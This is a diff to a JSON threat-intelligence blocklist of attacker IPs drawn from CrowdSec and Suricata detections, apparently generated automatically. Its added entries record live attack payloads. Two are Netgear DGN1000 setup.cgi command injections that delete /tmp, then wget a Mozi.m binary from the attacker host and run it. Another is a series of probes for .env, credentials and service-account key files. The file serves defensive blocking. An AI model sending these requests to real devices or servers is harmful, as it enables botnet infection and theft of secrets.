@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-04-29T01:00:00Z",
+  "generated_at": "2026-04-29T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 26,
-    "v4": 26,
+    "total": 28,
+    "v4": 28,
     "v6": 0
   },
   "items": [
@@ -27,28 +27,6 @@
       "asn_prefix": "79.124.40.0/24",
       "payloads": [
         "POST /"
-      ]
-    },
-    {
-      "ip": "20.216.170.198",
-      "family": "v4",
-      "first_seen": "2026-04-22T10:00:00Z",
-      "last_seen": "2026-04-22T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.192.0.0/10",
-      "tags": [
-        "mwl:cloud=\"azure\""
       ]
     },
     {
@@ -453,6 +431,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "45102",
+      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
+      "asn_prefix": "47.91.112.0/20",
       "payloads": [
         "GET /dns-query?dns=-M4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
         "POST /dns-query",
@@ -575,6 +556,70 @@
       ],
       "payloads": [
         "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "223.123.72.70",
+      "family": "v4",
+      "first_seen": "2026-04-29T04:00:00Z",
+      "last_seen": "2026-04-29T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.72.70:38005/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "103.237.157.160",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.237.157.160:39938/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "88.151.33.51",
+      "family": "v4",
+      "first_seen": "2026-04-29T03:00:00Z",
+      "last_seen": "2026-04-29T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /",
+        "GET /secrets.json",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /api/.env",
+        "GET /.cursor/mcp.json",
+        "GET /backend/.env",
+        "GET /credentials.json",
+        "GET /.env.backup",
+        "GET /laravel/.env",
+        "GET /serviceAccountKey.json"
       ]
     }
   ]
